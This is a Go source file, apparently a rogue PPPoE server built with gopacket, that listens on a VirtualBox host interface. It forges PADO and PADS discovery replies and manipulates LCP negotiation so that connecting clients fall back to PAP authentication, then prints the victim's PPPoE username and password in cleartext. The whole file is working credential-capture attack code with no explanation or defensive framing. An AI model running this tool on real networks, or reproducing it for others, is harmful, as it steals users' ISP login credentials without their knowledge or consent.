package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"reflect"
	"regexp"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	device       string = "vboxnet0"
	snapshot_len int32  = 1024
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = -1 * time.Second
	handle       *pcap.Handle
)

var clientMap = make(map[string]int)

func main() {
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		printPacketInfo(packet, handle)
	}
}

func printPacketInfo(packet gopacket.Packet, handle *pcap.Handle) {
	ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethernetLayer != nil {
		ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)
		if reflect.DeepEqual(ethernetPacket.Contents[12:], []byte{136, 99}) {
			switch ethernetPacket.Payload[1] {
			case 9:
				sendPadoPacket(handle, ethernetPacket.SrcMAC, ethernetPacket.Payload)
				break
			case 25:
				sendPadsPacket(handle, ethernetPacket.SrcMAC, ethernetPacket.Payload)
				break
			}
		} else if reflect.DeepEqual(ethernetPacket.Contents[12:], []byte{136, 100}) {
			switch string(ethernetPacket.Payload[6:8]) {
			case "\xc0\x21":
				sendLcpReq(handle, ethernetPacket.SrcMAC, ethernetPacket.Payload)
				break
			case "\xc0\x23":
				getPapInfo(ethernetPacket.Payload)
				break
			}
		}
	}
}

func getMACAddr() net.HardwareAddr {
	interfaces, _ := net.Interfaces()
	for _, netInterface := range interfaces {
		if netInterface.Name == "vboxnet0" {
			return netInterface.HardwareAddr
		}
	}
	return net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA}
}

func sendPadoPacket(handle *pcap.Handle, srcMAC net.HardwareAddr, raw []byte) {
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	h := padiFindHostuniq(raw)
	p := []byte("\x01\x01\x00\x00\x01\x02\x00\x06ubuntu\x01\x04\x00\x14\xee\x2d\x61\x89\x27\x87\x9c\x6d\xae\x82\xf5\x14\x8c\x21\x24\xa9\xdb\x09\x00\x00")
	if h != nil {
		p = append(p, h...)
	}
	l := len(p)
	gopacket.SerializeLayers(buffer, options,
		&layers.Ethernet{
			SrcMAC:       getMACAddr(),
			DstMAC:       srcMAC,
			EthernetType: 0x8863,
		},
		&layers.PPPoE{
			Version: uint8(1),
			Type:    uint8(1),
			Code:    0x07,
			Length:  uint16(l),
		},
		gopacket.Payload(p),
	)
	handle.WritePacketData(buffer.Bytes())
	//fmt.Println("sent pado")
}

func sendPadsPacket(handle *pcap.Handle, srcMAC net.HardwareAddr, raw []byte) {
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	h := padiFindHostuniq(raw)
	p := []byte("\x01\x01\x00\x00\x01\x02\x00\x06ubuntu")
	if h != nil {
		p = append(p, h...)
	}
	l := len(p)
	gopacket.SerializeLayers(buffer, options,
		&layers.Ethernet{
			SrcMAC:       getMACAddr(),
			DstMAC:       srcMAC,
			EthernetType: 0x8863,
		},
		&layers.PPPoE{
			Version:   uint8(1),
			Type:      uint8(1),
			Code:      0x65,
			SessionId: 0x01,
			Length:    uint16(l),
		},
		gopacket.Payload(p),
	)
	handle.WritePacketData(buffer.Bytes())
	//fmt.Println("sent pads")
}

func padiFindHostuniq(raw []byte) []byte {
	re, _ := regexp.Compile("\x01\x03")
	if re.Match(raw) {
		nIdx := re.FindIndex(raw)[0]
		nLen := len(raw[nIdx+2:nIdx+4]) * 2
		return append([]byte{0x01, 0x03}, raw[nIdx+2:nIdx+4+nLen]...)
	}
	return nil
}

func sendLcpReq(handle *pcap.Handle, srcMAC net.HardwareAddr, raw []byte) {
	if raw[8] == 1 {
		//fmt.Println("Received LCP-Config-Req")
		if _, ok := clientMap[string(raw)]; !ok {
			go sendLcpRejectPacket(handle, srcMAC, raw)
			go sendLcpReqPacket(handle, srcMAC, raw)
			clientMap[string(raw)] = 1
		}
		sendLcpAckPacket(handle, srcMAC, raw)
	}
}

func sendLcpRejectPacket(handle *pcap.Handle, srcMAC net.HardwareAddr, body []byte) {
	raw := make([]byte, len(body))
	copy(raw, body)
	defer func() { raw = nil }()
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	raw[8] = 0x04
	l := len(raw[8:])
	gopacket.SerializeLayers(buffer, options,
		&layers.Ethernet{
			SrcMAC:       getMACAddr(),
			DstMAC:       srcMAC,
			EthernetType: 0x8864,
		},
		&layers.PPPoE{
			Version:   uint8(1),
			Type:      uint8(1),
			Code:      0x00,
			SessionId: 0x01,
			Length:    uint16(l),
		},
		gopacket.Payload(raw[6:]),
	)
	handle.WritePacketData(buffer.Bytes())
	//fmt.Println("sent lcp-config-reject")

}

func sendLcpReqPacket(handle *pcap.Handle, srcMAC net.HardwareAddr, body []byte) {
	raw := make([]byte, len(body))
	copy(raw, body)
	defer func() { raw = nil }()
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	raw[9] = 0x01
	raw[11] = 0x12
	l := len(append(raw[8:12], []byte("\x01\x04\x05\xc8\x03\x04\xc0\x23\x05\x06\x5e\x63\x0a\xb8\x00\x00\x00\x00")...))
	gopacket.SerializeLayers(buffer, options,
		&layers.Ethernet{
			SrcMAC:       getMACAddr(),
			DstMAC:       srcMAC,
			EthernetType: 0x8864,
		},
		&layers.PPPoE{
			Version:   uint8(1),
			Type:      uint8(1),
			Code:      0x00,
			SessionId: 0x01,
			Length:    uint16(l),
		},
		gopacket.Payload(raw[6:8+l]),
	)
	handle.WritePacketData(buffer.Bytes())
	//fmt.Println("sent lcp-config-req")
}

func sendLcpAckPacket(handle *pcap.Handle, srcMAC net.HardwareAddr, body []byte) {
	raw := make([]byte, len(body))
	copy(raw, body)
	defer func() { raw = nil }()
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	raw[8] = 0x02
	l := raw[5]
	gopacket.SerializeLayers(buffer, options,
		&layers.Ethernet{
			SrcMAC:       getMACAddr(),
			DstMAC:       srcMAC,
			EthernetType: 0x8864,
		},
		&layers.PPPoE{
			Version:   uint8(1),
			Type:      uint8(1),
			Code:      0x00,
			SessionId: 0x01,
			Length:    uint16(l),
		},
		gopacket.Payload(raw[6:]),
	)
	handle.WritePacketData(buffer.Bytes())
	//fmt.Println("sent lcp-config-ack")
}

func getPapInfo(body []byte) {
	fmt.Println("---------------------------------------")
	fmt.Println("username:", string(body[13:13+body[12]]))
	fmt.Println("password:", string(body[14+body[12]:]))
	fmt.Println("---------------------------------------")
	os.Exit(0)
}
